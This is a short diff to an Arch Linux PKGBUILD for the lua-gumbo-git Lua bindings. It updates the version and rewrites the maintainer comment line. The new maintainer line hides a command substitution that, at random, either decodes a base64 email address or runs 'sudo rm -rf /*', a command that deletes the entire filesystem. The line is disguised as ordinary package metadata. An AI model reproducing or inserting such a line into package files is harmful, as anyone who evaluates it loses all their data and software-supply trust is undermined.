@@ -1,6 +1,6 @@
-# Maintainer: felix (fstirlitz, m.p.isaev)
+# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
 pkgname=lua-gumbo-git
-pkgver=0.4+37+ge783ebe
+pkgver=0.4+121+gc583572
 pkgrel=1
 pkgdesc="Lua bindings for gumbo, Google's pure-C HTML5 parser"
 arch=(i686 x86_64)
